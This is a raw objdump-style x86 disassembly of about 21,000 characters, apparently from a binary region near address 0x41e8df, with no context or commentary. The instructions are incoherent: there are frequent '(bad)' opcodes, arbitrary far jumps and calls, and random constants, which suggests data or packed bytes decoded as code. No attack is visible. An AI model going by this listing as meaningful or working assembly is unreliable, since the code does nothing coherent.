  41e8df:	and    BYTE PTR [ecx],al
  41e8e1:	leave  
  41e8e2:	js     0x41e878
  41e8e4:	into   
  41e8e5:	dec    esp
  41e8e6:	(bad)  
  41e8e7:	xchg   ecx,eax
  41e8e8:	popa   
  41e8e9:	adc    al,bh
  41e8eb:	xchg   ebx,eax
  41e8ec:	or     edi,DWORD PTR [ecx-0x6f]
  41e8ef:	fadd   QWORD PTR [ebx+0x78]
  41e8f2:	xchg   cl,ch
  41e8f4:	sub    BYTE PTR [eax],ch
  41e8f6:	add    BYTE PTR [ebx],0x58
  41e8f9:	cwde   
  41e8fa:	icebp  
  41e8fb:	shl    BYTE PTR [eax+0x69014ee8],cl
  41e901:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e902:	popa   
  41e903:	jne    0x41e8bf
  41e905:	inc    eax
  41e906:	(bad)  
  41e907:	sbb    eax,0x19f95e76
  41e90c:	stos   DWORD PTR es:[edi],eax
  41e90d:	mov    bh,0x33
  41e90f:	fld    TBYTE PTR [ebp-0xf]
  41e912:	je     0x41e927
  41e914:	adc    al,0xe3
  41e916:	jno    0x41e983
  41e918:	jecxz  0x41e951
  41e91a:	adc    al,0xab
  41e91c:	mov    cl,ch
  41e91e:	xchg   ecx,eax
  41e91f:	inc    esi
  41e920:	out    dx,eax
  41e921:	inc    eax
  41e922:	lahf   
  41e923:	push   esp
  41e924:	cld    
  41e925:	enter  0x4df6,0x2a
  41e929:	inc    esp
  41e92a:	mov    ecx,0x6db87f7d
  41e92f:	(bad)  
  41e930:	push   ecx
  41e931:	jmp    0x19e:0x620e66b4
  41e938:	call   0xc34e:0x59fd3112
  41e93f:	or     eax,0x1aadd1f3
  41e944:	jno    0x41e90d
  41e946:	outs   dx,BYTE PTR ds:[esi]
  41e947:	clc    
  41e948:	dec    esp
  41e949:	mov    edi,0x55cc9cc5
  41e94e:	ins    BYTE PTR es:[edi],dx
  41e94f:	not    ebp
  41e951:	pop    edi
  41e952:	call   0x5b54:0x7c039ac
  41e959:	fistp  WORD PTR [edi-0x571c2866]
  41e95f:	(bad)  
  41e960:	in     al,dx
  41e961:	nop
  41e962:	pop    ds
  41e963:	mov    ecx,0xfbbe41c7
  41e968:	bound  edx,QWORD PTR [edi-0x3522d1ee]
  41e96e:	out    0x8b,al
  41e970:	mov    ch,0x11
  41e972:	inc    eax
  41e973:	ret    
  41e974:	xchg   ebp,eax
  41e975:	outs   dx,DWORD PTR ds:[esi]
  41e976:	pushf  
  41e977:	push   0xb5354b3d
  41e97c:	outs   dx,DWORD PTR ds:[esi]
  41e97d:	mov    eax,es:0xe835c3b5
  41e983:	in     al,dx
  41e984:	in     al,0xaa
  41e986:	repz push eax
  41e988:	daa    
  41e989:	cli    
  41e98a:	mov    fs,edx
  41e98c:	add    esi,DWORD PTR [esi+ebx*1-0x4d]
  41e990:	rcr    DWORD PTR [ebx-0x17a16da6],cl
  41e996:	or     edi,DWORD PTR [esi+ecx*2-0x3f]
  41e99a:	add    bh,bh
  41e99c:	xchg   edi,eax
  41e99d:	lea    ebp,[esi-0x30]
  41e9a0:	je     0x41e974
  41e9a2:	add    DWORD PTR [esi],ebx
  41e9a4:	push   eax
  41e9a5:	xor    ch,BYTE PTR [edi]
  41e9a7:	outs   dx,DWORD PTR ds:[esi]
  41e9a8:	add    DWORD PTR [ebp+0x35f0016e],0x8
  41e9af:	inc    ebp
  41e9b0:	mov    ebx,0x6ca2c6b
  41e9b5:	imul   edi,esi,0x60
  41e9b8:	fcom   st(6)
  41e9ba:	mov    dh,0xd
  41e9bc:	sbb    ebp,DWORD PTR [edx+0x3e]
  41e9bf:	fcmovnb st,st(1)
  41e9c1:	out    dx,eax
  41e9c2:	and    eax,0x654a2d78
  41e9c7:	std    
  41e9c8:	pop    ss
  41e9c9:	jb     0x41e9aa
  41e9cb:	dec    ebp
  41e9cc:	mov    dh,BYTE PTR fs:[ecx-0x41]
  41e9d0:	loop   0x41e979
  41e9d2:	mov    ebp,0x132091ef
  41e9d7:	jle    0x41e96c
  41e9d9:	mov    ebx,0x7338fb7d
  41e9de:	stos   BYTE PTR es:[edi],al
  41e9df:	sbb    edx,edx
  41e9e1:	jle    0x41e9ce
  41e9e3:	dec    ebx
  41e9e4:	pusha  
  41e9e5:	mov    edx,0x5e51b8c4
  41e9ea:	xor    BYTE PTR ss:[ebp-0x4a],bh
  41e9ee:	jle    0x41e9f8
  41e9f0:	jmp    0x4301:0xb798f113
  41e9f7:	pop    ebx
  41e9f8:	jle    0x41ea1c
  41e9fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9fb:	sar    BYTE PTR [edx],cl
  41e9fd:	mov    ds:0xab76d4d2,al
  41ea02:	and    esp,ebp
  41ea04:	repz pop ds
  41ea06:	xchg   BYTE PTR [edx+0x325649ee],bl
  41ea0c:	rol    BYTE PTR [esi],1
  41ea0e:	jns    0x41e9ca
  41ea10:	inc    ebx
  41ea11:	ficom  WORD PTR [ebx]
  41ea13:	or     ch,BYTE PTR [esi+edi*4+0x30f4a0fa]
  41ea1a:	sbb    al,0x98
  41ea1c:	mov    dh,0x74
  41ea1e:	sbb    eax,0x7bb77b96
  41ea23:	es add eax,0xb4da5371
  41ea29:	jecxz  0x41ea83
  41ea2b:	test   al,0x56
  41ea2d:	rcr    DWORD PTR [edi+0x32],1
  41ea30:	inc    edi
  41ea31:	cwde   
  41ea32:	push   ss
  41ea33:	in     al,dx
  41ea34:	push   ecx
  41ea35:	dec    ebx
  41ea36:	clc    
  41ea37:	aas    
  41ea38:	hlt    
  41ea39:	xor    bl,0xbc
  41ea3c:	mov    ebp,0xa52fa29f
  41ea41:	pusha  
  41ea42:	jmp    DWORD PTR [edx-0x593db938]
  41ea48:	mov    eax,0x3649d514
  41ea4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea4e:	cmp    ebx,DWORD PTR [ebx-0x64]
  41ea51:	scas   al,BYTE PTR es:[edi]
  41ea52:	xchg   esi,eax
  41ea53:	popa   
  41ea54:	sub    BYTE PTR [eax-0x7],ah
  41ea57:	(bad)  
  41ea59:	and    edx,DWORD PTR [ebx-0x34]
  41ea5c:	add    al,0x9a
  41ea5e:	mov    esp,0xba0438ce
  41ea63:	push   edx
  41ea64:	sub    BYTE PTR [edi+0x68],0x9a
  41ea68:	mov    eax,ds:0x145303cb
  41ea6d:	dec    esp
  41ea6e:	arpl   WORD PTR [edx+0x25],sp
  41ea71:	lahf   
  41ea72:	fnstcw WORD PTR [ebx]
  41ea74:	add    al,0xe2
  41ea76:	aas    
  41ea77:	sbb    BYTE PTR [ebx-0xbd15dec],0xb
  41ea7e:	(bad)  
  41ea80:	jl     0x41ea2d
  41ea82:	push   ebx
  41ea83:	fcmovb st,st(2)
  41ea85:	test   eax,ebx
  41ea87:	inc    ebp
  41ea88:	rcl    DWORD PTR [ebx],1
  41ea8a:	xor    DWORD PTR [ebx],0x1519b30a
  41ea90:	test   al,0x8a
  41ea92:	inc    esi
  41ea93:	dec    esi
  41ea94:	lods   al,BYTE PTR ds:[esi]
  41ea95:	es push 0xffffffec
  41ea98:	out    0x77,al
  41ea9a:	aas    
  41ea9b:	ror    cl,1
  41ea9d:	pop    edi
  41ea9e:	(bad)  
  41ea9f:	loope  0x41eaa4
  41eaa1:	gs dec esp
  41eaa3:	sahf   
  41eaa4:	cmc    
  41eaa5:	mov    eax,ds:0x75732694
  41eaaa:	xchg   DWORD PTR [esi-0x19f88476],esi
  41eab0:	dec    esp
  41eab1:	mov    cl,0x95
  41eab3:	mov    ebp,0x98ebb53
  41eab8:	out    0x94,al
  41eaba:	js     0x41ea7d
  41eabc:	in     al,0xba
  41eabe:	les    esi,FWORD PTR [ebp+0x2dc32492]
  41eac4:	jns    0x41ea92
  41eac6:	(bad)
  41eac9:	fcom   QWORD PTR [edx+esi*2-0x11]
  41eacd:	dec    edx
  41eace:	and    eax,0x3bf1c5a9
  41ead3:	bound  esp,QWORD PTR [edx+0x20]
  41ead6:	sub    DWORD PTR [ecx],0xfffffffe
  41ead9:	inc    esi
  41eada:	add    eax,0xa8119844
  41eadf:	ja     0x41eb2e
  41eae1:	call   DWORD PTR [ebp-0x2ec0d8a6]
  41eae7:	hlt    
  41eae8:	ret    
  41eae9:	cwde   
  41eaea:	fnstsw ax
  41eaec:	in     al,dx
  41eaed:	inc    esi
  41eaee:	xor    DWORD PTR [edx],edi
  41eaf0:	xor    DWORD PTR [ebx],edx
  41eaf2:	mov    al,ds:0x59d60f6c
  41eaf7:	hlt    
  41eaf8:	mov    al,ds:0x999fddb3
  41eafd:	lods   eax,DWORD PTR ds:[esi]
  41eafe:	sti    
  41eaff:	stos   DWORD PTR es:[edi],eax
  41eb00:	es pop esi
  41eb02:	or     DWORD PTR [ebp-0x4fe9f97a],esp
  41eb08:	out    dx,eax
  41eb09:	pop    ss
  41eb0a:	cmp    BYTE PTR [edi],dh
  41eb0c:	(bad)  
  41eb0d:	dec    edx
  41eb0e:	pop    es
  41eb0f:	ins    DWORD PTR es:[edi],dx
  41eb10:	loope  0x41eb35
  41eb12:	in     al,dx
  41eb13:	sbb    DWORD PTR [ebx-0x12a2d241],edi
  41eb19:	mov    cl,0x8f
  41eb1b:	jae    0x41eb47
  41eb1d:	(bad)  
  41eb1e:	shl    BYTE PTR [ebx+0x25c5fe82],0x8d
  41eb25:	xlat   BYTE PTR ds:[ebx]
  41eb26:	test   BYTE PTR [edx],dh
  41eb28:	iret   
  41eb29:	lock jl 0x41eb33
  41eb2c:	sti    
  41eb2d:	and    eax,0xb6d3c8e7
  41eb32:	fnstsw WORD PTR [eax]
  41eb34:	xlat   BYTE PTR ds:[ebx]
  41eb35:	mov    ebp,0xaf578cff
  41eb3a:	stos   DWORD PTR es:[edi],eax
  41eb3b:	jo     0x41eb24
  41eb3d:	sbb    esi,DWORD PTR [ebp+0x79]
  41eb40:	push   ecx
  41eb41:	mov    ch,0x9d
  41eb43:	or     ecx,DWORD PTR [ebp+0x1e]
  41eb46:	aam    0xa
  41eb48:	xor    DWORD PTR [ebx-0x4932d252],edi
  41eb4e:	loope  0x41ebb0
  41eb50:	jecxz  0x41ebae
  41eb52:	jge    0x41eadd
  41eb54:	popf   
  41eb55:	cmp    DWORD PTR [edx],edi
  41eb57:	cwde   
  41eb58:	cmp    edx,DWORD PTR [esi+0x7d]
  41eb5b:	mov    edx,0x2933d24e
  41eb60:	sub    edi,DWORD PTR [ecx-0x77b995ef]
  41eb66:	sub    BYTE PTR [ebp-0x3e],ah
  41eb69:	sahf   
  41eb6a:	xchg   ebp,eax
  41eb6b:	push   edx
  41eb6c:	jg     0x41eb26
  41eb6e:	cmp    BYTE PTR [ecx],ch
  41eb70:	mov    ah,0x35
  41eb72:	or     ebx,DWORD PTR [ebp+0xe]
  41eb75:	inc    eax
  41eb76:	rol    DWORD PTR [ecx-0xf],0xfc
  41eb7a:	xchg   ebp,eax
  41eb7b:	add    dl,BYTE PTR [edx]
  41eb7d:	shr    DWORD PTR gs:0x87dd3a4c,cl
  41eb84:	pop    es
  41eb85:	test   al,0x56
  41eb87:	and    dl,dl
  41eb89:	xor    eax,0x7ca64ee4
  41eb8e:	mov    edx,0x1e144e6e
  41eb93:	ins    DWORD PTR es:[edi],dx
  41eb94:	ins    BYTE PTR es:[edi],dx
  41eb95:	cmp    esp,edx
  41eb97:	lock and BYTE PTR [edx+edx*4+0x36],dh
  41eb9c:	mov    eax,ds:0x19985bd9
  41eba1:	cs push si
  41eba4:	or     bh,cl
  41eba6:	mov    eax,0x3dcf0a53
  41ebab:	inc    eax
  41ebac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebad:	out    dx,eax
  41ebae:	sti    
  41ebaf:	sahf   
  41ebb0:	push   esp
  41ebb1:	xchg   ebp,eax
  41ebb2:	inc    edi
  41ebb3:	lea    esi,[ebx]
  41ebb5:	into   
  41ebb6:	adc    edi,esp
  41ebb8:	and    BYTE PTR [ebp+0x6],ch
  41ebbb:	dec    esi
  41ebbc:	push   0x3f
  41ebbe:	je     0x41eb70
  41ebc0:	(bad)  
  41ebc1:	fstp   DWORD PTR [edx+0x41e3c739]
  41ebc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebc8:	jle    0x41ebe0
  41ebca:	test   ebx,edx
  41ebcc:	fwait
  41ebcd:	sbb    al,0x34
  41ebcf:	mov    ah,0xda
  41ebd1:	pop    esp
  41ebd2:	mov    eax,ds:0x127c1732
  41ebd7:	mov    ds:0xa042ceb8,al
  41ebdc:	cli    
  41ebdd:	arpl   WORD PTR [edx+edx*2],cx
  41ebe0:	leave  
  41ebe1:	and    BYTE PTR [edx],0x2a
  41ebe4:	(bad)  [ebx-0x5299faf1]
  41ebea:	inc    ecx
  41ebeb:	fisub  WORD PTR [esi]
  41ebed:	and    eax,DWORD PTR cs:[edx+esi*2]
  41ebf1:	inc    edi
  41ebf2:	outs   dx,DWORD PTR ds:[esi]
  41ebf3:	(bad)  [ebp+0x79cce5cc]
  41ebf9:	addr16 (bad) 
  41ebfb:	aam    0xd1
  41ebfd:	mov    dl,0x6c
  41ebff:	mov    WORD PTR [esp+edi*1-0x2794495e],?
  41ec06:	xchg   ebx,eax
  41ec07:	mov    ds:0xcaeee099,eax
  41ec0c:	sbb    eax,ebp
  41ec0e:	xchg   BYTE PTR [ebp+0x75],bh
  41ec11:	sbb    ah,0xe4
  41ec14:	jle    0x41ebbe
  41ec16:	sub    DWORD PTR [edx+0x3c],ecx
  41ec19:	shl    dl,cl
  41ec1b:	and    eax,0x1ccf8840
  41ec20:	dec    esi
  41ec21:	push   edx
  41ec22:	pop    esp
  41ec23:	adc    al,0xce
  41ec25:	inc    ecx
  41ec26:	js     0x41ec1d
  41ec28:	xchg   edx,eax
  41ec29:	mov    DWORD PTR [edi+0x7120c450],eax
  41ec2f:	dec    edi
  41ec30:	push   eax
  41ec31:	xchg   ebp,eax
  41ec32:	jbe    0x41ebf6
  41ec34:	mov    ds,ebx
  41ec36:	push   0x457d5cef
  41ec3b:	sti    
  41ec3c:	add    BYTE PTR [ecx],ch
  41ec3e:	fbstp  TBYTE PTR [eax]
  41ec40:	std    
  41ec41:	and    BYTE PTR [ecx],dh
  41ec43:	je     0x41ebf4
  41ec45:	dec    di
  41ec47:	sub    eax,0xe1f64d49
  41ec4c:	je     0x41ec33
  41ec4e:	ja     0x41ebd2
  41ec50:	sbb    BYTE PTR [eax+0x514f36c6],0xe2
  41ec57:	fisubr DWORD PTR [eax+0x78]
  41ec5a:	sbb    al,0xa6
  41ec5c:	jmp    0x5f943b5e
  41ec61:	imul   esi,DWORD PTR [edi-0x14],0x46
  41ec65:	pop    es
  41ec66:	jmp    0xe8c3a738
  41ec6b:	mov    esp,0xde9cca4a
  41ec70:	adc    bh,BYTE PTR [eax+0x89aa2b1]
  41ec76:	(bad)  
  41ec78:	das    
  41ec79:	dec    ebp
  41ec7a:	pop    ss
  41ec7b:	cdq    
  41ec7c:	(bad)  
  41ec7d:	out    dx,eax
  41ec7e:	adc    edx,DWORD PTR [esi+0x43073a58]
  41ec84:	ror    BYTE PTR cs:[ecx+ebx*4],1
  41ec88:	dec    esi
  41ec89:	pop    edi
  41ec8a:	xchg   edi,eax
  41ec8b:	popf   
  41ec8c:	test   eax,0x95666af3
  41ec91:	mov    WORD PTR [esi+0x56],gs
  41ec94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec95:	popa   
  41ec96:	shr    BYTE PTR ds:0x6366eb46,cl
  41ec9c:	test   DWORD PTR [edx],0x7269b1de
  41eca2:	mov    ah,BYTE PTR [ecx]
  41eca4:	ins    BYTE PTR es:[edi],dx
  41eca5:	mov    bh,0x4d
  41eca7:	jb     0xa7fdd037
  41ecad:	push   esi
  41ecae:	mov    ebp,0xcd10dd43
  41ecb3:	retf   
  41ecb4:	ins    DWORD PTR es:[edi],dx
  41ecb5:	arpl   WORD PTR [edi+0x2d],ax
  41ecb8:	out    dx,eax
  41ecb9:	inc    edi
  41ecba:	mov    al,ds:0xedd8e114
  41ecbf:	xor    eax,0xff158da0
  41ecc4:	scas   eax,DWORD PTR es:[edi]
  41ecc5:	mov    ecx,0xc493af0c
  41ecca:	and    BYTE PTR [ecx],0xf4
  41eccd:	push   ss
  41ecce:	lods   al,BYTE PTR ds:[esi]
  41eccf:	lods   al,BYTE PTR ds:[esi]
  41ecd0:	sub    BYTE PTR [eiz*4-0x188c07a],0x6a
  41ecd8:	std    
  41ecd9:	pop    edx
  41ecda:	shl    BYTE PTR [edi-0x2e],cl
  41ecdd:	jp     0x41ed3d
  41ecdf:	pop    ebp
  41ece0:	sbb    BYTE PTR [eax],cl
  41ece2:	out    dx,eax
  41ece3:	mov    DWORD PTR [esi+0x190e7487],esi
  41ece9:	inc    ebx
  41ecea:	xor    eax,0xca2921bc
  41ecef:	push   eax
  41ecf0:	(bad)  
  41ecf1:	jns    0x41ed02
  41ecf3:	aam    0x60
  41ecf5:	out    0xe7,al
  41ecf7:	add    al,0xb1
  41ecf9:	dec    esi
  41ecfa:	je     0x41ed61
  41ecfc:	push   0xffffffe1
  41ecfe:	and    BYTE PTR ss:[eax+0x5b],0x77
  41ed03:	dec    eax
  41ed04:	pop    esp
  41ed05:	je     0x41ecae
  41ed07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed08:	inc    edi
  41ed09:	sbb    ecx,esi
  41ed0b:	jns    0x41ed6f
  41ed0d:	retf   0xe526
  41ed10:	push   ds
  41ed11:	imul   ebx,ebp,0xffffffd6
  41ed14:	push   0x4fb9691
  41ed19:	imul   DWORD PTR [edi+0x41]
  41ed1c:	in     al,dx
  41ed1d:	jmp    0x8023:0xf36c0884
  41ed24:	js     0x41ecba
  41ed26:	add    DWORD PTR [ebp+0x289d8ee0],0xc99a1197
  41ed30:	in     eax,0x60
  41ed32:	push   eax
  41ed33:	or     eax,0x37844b0f
  41ed38:	mov    eax,0x395a29f0
  41ed3d:	data16 aad 0x89
  41ed40:	xchg   esp,eax
  41ed41:	icebp  
  41ed42:	in     eax,0x93
  41ed44:	jae    0x41ece8
  41ed46:	sub    ch,bl
  41ed48:	cmp    DWORD PTR [ebp-0x14],0x332814c4
  41ed4f:	sub    cl,BYTE PTR [ecx]
  41ed51:	adc    al,bh
  41ed53:	pop    esp
  41ed54:	and    ch,dl
  41ed56:	rol    DWORD PTR [edx+0x69],1
  41ed59:	mov    cs,WORD PTR [ecx+0x1f0ed96b]
  41ed5f:	sub    bh,ch
  41ed61:	shl    ebp,1
  41ed63:	xchg   esp,eax
  41ed64:	jecxz  0x41ece7
  41ed66:	idiv   DWORD PTR [ebp-0x385231b0]
  41ed6c:	cwde   
  41ed6d:	or     edx,DWORD PTR [eax]
  41ed6f:	cmp    DWORD PTR [ebp*4-0xdf20c8f],0x46
  41ed77:	push   eax
  41ed78:	push   ecx
  41ed79:	inc    edx
  41ed7a:	inc    ecx
  41ed7b:	leave  
  41ed7c:	call   0xe8ec:0x51c47de8
  41ed83:	mov    edi,0x8ae0520d
  41ed88:	inc    eax
  41ed89:	adc    ecx,DWORD PTR [edi+0x5d]
  41ed8c:	inc    ebx
  41ed8d:	adc    DWORD PTR [ebp-0x6b],edi
  41ed90:	xchg   ebx,eax
  41ed91:	xlat   BYTE PTR ds:[ebx]
  41ed92:	jecxz  0x41ede6
  41ed94:	popf   
  41ed95:	jns    0x41ed48
  41ed97:	sahf   
  41ed98:	adc    eax,0x105cddb1
  41ed9d:	push   ds
  41ed9e:	repz cs int3 
  41eda1:	or     dh,BYTE PTR [esi]
  41eda3:	push   cs
  41eda4:	dec    si
  41eda6:	dec    ebx
  41eda7:	and    eax,0x8524c468
  41edac:	call   0x581e:0x1108b1e
  41edb3:	and    al,0xdb
  41edb5:	out    dx,eax
  41edb6:	jbe    0x41ee23
  41edb8:	sub    eax,0x12fe2918
  41edbd:	stc    
  41edbe:	lods   al,BYTE PTR ds:[esi]
  41edbf:	mov    ds:0xae552d82,eax
  41edc4:	jmp    0x4c67f89a
  41edc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edca:	xchg   ebp,eax
  41edcb:	fs push es
  41edcd:	adc    eax,0x2d
  41edd0:	and    al,0x74
  41edd2:	std    
  41edd3:	push   0x7b24afe3
  41edd8:	dec    di
  41edda:	jle    0x41ee51
  41eddc:	cld    
  41eddd:	sbb    ebp,ebx
  41eddf:	pop    edx
  41ede0:	popa   
  41ede1:	push   ss
  41ede2:	mov    ch,0x15
  41ede4:	sbb    al,dh
  41ede6:	loopne 0x41ee60
  41ede8:	aas    
  41ede9:	gs retf 0x67cd
  41eded:	cld    
  41edee:	cmp    al,ch
  41edf0:	mov    esp,0xb5964dc0
  41edf5:	or     BYTE PTR [esi+0x11],ch
  41edf8:	call   0x829468bd
  41edfd:	xor    BYTE PTR [ecx],cl
  41edff:	enter  0x70a5,0xbd
  41ee03:	dec    ecx
  41ee04:	xor    dh,al
  41ee06:	call   0x2ea372c7
  41ee0b:	jmp    0xf5773e0c
  41ee10:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41ee12:	xor    eax,0xff8c6f7f
  41ee17:	jl     0x41edaf
  41ee19:	xor    al,BYTE PTR [edi-0x74]
  41ee1c:	nop
  41ee1d:	dec    edi
  41ee1e:	(bad)  
  41ee1f:	cmp    al,0x43
  41ee21:	dec    BYTE PTR [eax+0x2f355ef3]
  41ee27:	data16 sub BYTE PTR [edx-0x13ccb840],0x29
  41ee2f:	adc    DWORD PTR [edi],0x13
  41ee32:	daa    
  41ee33:	pop    esp
  41ee34:	jecxz  0x41edb7
  41ee36:	ins    DWORD PTR es:[edi],dx
  41ee37:	jl     0x41ede8
  41ee39:	mov    bl,0xe4
  41ee3b:	int3   
  41ee3c:	add    al,0x7a
  41ee3e:	or     eax,0x61f81dcc
  41ee43:	aaa    
  41ee44:	mov    bl,0x1d
  41ee46:	adc    ah,BYTE PTR [esi+0x43bfd016]
  41ee4c:	les    edi,FWORD PTR [edi]
  41ee4e:	push   ebx
  41ee4f:	jp     0x41edf5
  41ee51:	out    dx,al
  41ee52:	jl     0x41eec1
  41ee54:	loop   0x41ee25
  41ee56:	or     BYTE PTR [ebp+0x5f667326],ah
  41ee5c:	adc    bh,BYTE PTR [edi]
  41ee5e:	push   ss
  41ee5f:	(bad)  
  41ee61:	shr    BYTE PTR [edx-0x3b62191e],cl
  41ee67:	rcl    bl,cl
  41ee69:	jno    0x41ee38
  41ee6b:	jnp    0x41eedd
  41ee6d:	in     eax,dx
  41ee6e:	lahf   
  41ee6f:	fnstenv [esi-0x257a0a85]
  41ee75:	aam    0x62
  41ee77:	out    0x69,al
  41ee79:	test   eax,0x89ce4c3
  41ee7e:	inc    ebp
  41ee7f:	xor    DWORD PTR [eax-0x33],ecx
  41ee82:	stos   BYTE PTR es:[edi],al
  41ee83:	out    dx,al
  41ee84:	sub    ecx,DWORD PTR [ecx]
  41ee86:	repnz xchg ecx,eax
  41ee88:	out    0x9d,al
  41ee8a:	adc    eax,DWORD PTR [edi+0x68]
  41ee8d:	adc    eax,0xff7c5741
  41ee92:	ins    BYTE PTR es:[edi],dx
  41ee93:	loopne 0x41ee5f
  41ee95:	push   esp
  41ee96:	push   esi
  41ee97:	jp     0x41eee4
  41ee99:	leave  
  41ee9a:	lds    edx,FWORD PTR ds:0xd8882e59
  41eea0:	fistp  QWORD PTR [edx-0x40]
  41eea3:	add    esp,DWORD PTR [ebx-0xb]
  41eea6:	and    al,dh
  41eea8:	xor    al,0x61
  41eeaa:	add    bl,BYTE PTR [ecx-0x5610fba4]
  41eeb0:	hlt    
  41eeb1:	test   DWORD PTR [ecx+0x62],0xb86ffef5
  41eeb8:	xchg   ebp,eax
  41eeb9:	fs out dx,al
  41eebb:	(bad)  [edi+ebp*1]
  41eebe:	mov    dh,0x8b
  41eec0:	mov    edi,0x6b9b219f
  41eec5:	pop    es
  41eec6:	xchg   ebx,eax
  41eec7:	jecxz  0x41ef01
  41eec9:	in     eax,dx
  41eeca:	adc    DWORD PTR [ecx+0x2b],0xead59312
  41eed1:	push   edx
  41eed2:	cmp    dl,BYTE PTR [ebx]
  41eed4:	pop    ds
  41eed5:	mov    dl,0x1c
  41eed7:	sbb    BYTE PTR [edx],dh
  41eed9:	out    dx,eax
  41eeda:	jnp    0x41ee6f
  41eedc:	leave  
  41eedd:	ss out 0x1f,eax
  41eee0:	retf   
  41eee1:	adc    esi,DWORD PTR [esi+0x5e]
  41eee4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eee5:	push   esi
  41eee6:	mov    ds,ebx
  41eee8:	scas   eax,DWORD PTR es:[edi]
  41eee9:	push   esi
  41eeea:	je     0x41ef0d
  41eeec:	jmp    0x41eeae
  41eeee:	retf   0x7a6c
  41eef1:	cmp    eax,0x5a283565
  41eef6:	jle    0x41ee9e
  41eef8:	fwait
  41eef9:	pop    es
  41eefa:	and    ch,BYTE PTR [ebx+0x7d]
  41eefd:	lahf   
  41eefe:	push   cs
  41eeff:	stos   DWORD PTR es:[edi],eax
  41ef00:	add    DWORD PTR [ecx-0x1e447276],eax
  41ef06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef07:	pop    eax
  41ef08:	dec    edx
  41ef09:	inc    esp
  41ef0a:	add    ch,BYTE PTR [edi+0x5daf8749]
  41ef10:	imul   ecx,esi,0x65ee7690
  41ef16:	xor    BYTE PTR gs:[ecx],0x8b
  41ef1a:	jl     0x41eeb9
  41ef1c:	pop    ss
  41ef1d:	jbe    0x41ef83
  41ef1f:	ret    0xb4c6
  41ef22:	xchg   esp,eax
  41ef23:	pop    ebp
  41ef24:	test   al,0xf1
  41ef26:	push   ss
  41ef27:	rcr    esi,1
  41ef29:	test   esi,0xeda0033d
  41ef2f:	jns    0x41efa0
  41ef31:	jns    0x41ef41
  41ef33:	fdiv   DWORD PTR [esi]
  41ef35:	addr16 loopne 0x41eee6
  41ef38:	js     0x41ef54
  41ef3a:	xor    ebp,DWORD PTR [edi-0x294173e2]
  41ef40:	cs dec esp
  41ef42:	retf   0x4092
  41ef45:	or     ecx,DWORD PTR [edi]
  41ef47:	adc    eax,DWORD PTR [ecx-0x6c]
  41ef4a:	jb     0x41eee8
  41ef4c:	mov    ch,0xa7
  41ef4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef4f:	dec    esi
  41ef50:	xchg   ecx,eax
  41ef51:	rcl    DWORD PTR [edi+ebx*8-0x66],cl
  41ef55:	jnp    0x41ef48
  41ef57:	cmp    DWORD PTR [esi],esi
  41ef59:	mov    DWORD PTR [edi+0x46fc23bc],ebx
  41ef5f:	enter  0xb25f,0x8d
  41ef63:	push   esp
  41ef64:	mov    ebx,0xafe63c67
  41ef69:	xchg   ebx,eax
  41ef6a:	mov    al,0xa9
  41ef6c:	xor    BYTE PTR [esi-0x4bff343e],dh
  41ef72:	(bad)  
  41ef73:	ins    DWORD PTR es:[edi],dx
  41ef74:	jecxz  0x41ef78
  41ef76:	pop    ebx
  41ef77:	retf   0x8aba
  41ef7a:	adc    ecx,DWORD PTR [esi-0x69]
  41ef7d:	ja     0x41ef23
  41ef7f:	inc    esp
  41ef80:	imul   eax,DWORD PTR ss:[ebx+0x297a0645],0x96b8d519
  41ef8b:	inc    ecx
  41ef8c:	call   0x48d2760a
  41ef91:	rcr    DWORD PTR [ebx+ebp*1-0x4da9c1c3],cl
  41ef98:	mov    ah,0xd7
  41ef9a:	push   edi
  41ef9b:	add    BYTE PTR [ebx],dl
  41ef9d:	dec    ebp
  41ef9e:	hlt    
  41ef9f:	jae    0x41ef4a
  41efa1:	sbb    eax,0xe455d621
  41efa6:	xor    esi,DWORD PTR [esi+0x26f083a0]
  41efac:	enter  0x7008,0xbb
  41efb0:	push   ecx
  41efb1:	jb     0x41ef5d
  41efb3:	xor    DWORD PTR [eax],edi
  41efb5:	out    dx,eax
  41efb6:	and    esi,0xffffffe7
  41efb9:	in     eax,0xd3
  41efbb:	aad    0xe8
  41efbd:	jo     0x41ef47
  41efbf:	cdq    
  41efc0:	ror    BYTE PTR [ecx+0x4d],1
  41efc3:	leave  
  41efc4:	xchg   BYTE PTR [edi+0x2c],ah
  41efc7:	daa    
  41efc8:	jae    0x41f041
  41efca:	outs   dx,DWORD PTR ds:[esi]
  41efcb:	mov    esp,0x55951aee
  41efd0:	push   ebp
  41efd1:	test   DWORD PTR [ecx+0x350ec073],eax
  41efd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efd8:	xlat   BYTE PTR ds:[ebx]
  41efd9:	mov    ch,0x31
  41efdb:	(bad)  
  41efdd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efde:	inc    edx
  41efdf:	dec    esi
  41efe0:	call   DWORD PTR [ecx+0x7d]
  41efe3:	sbb    al,0x19
  41efe5:	pop    ebp
  41efe6:	and    BYTE PTR ds:0xdb45c60d,0xfe
  41efed:	jmp    0x41efe5
  41efef:	lds    ebx,FWORD PTR [ebx+0xe66f262]
  41eff5:	cmp    esp,DWORD PTR [ebx-0x37]
  41eff8:	ins    BYTE PTR es:[edi],dx
  41eff9:	dec    eax
  41effa:	inc    ebp
  41effb:	nop
  41effc:	mov    edi,edi
  41effe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efff:	push   ebp
  41f000:	addr16 jbe 0x41f072
  41f003:	jno    0x41effe
  41f005:	xchg   ebx,eax
  41f006:	inc    ebp
  41f007:	test   BYTE PTR [edx],al
  41f009:	lods   al,BYTE PTR ds:[esi]
  41f00a:	jo     0x41f04d
  41f00c:	cmp    eax,0x898448a1
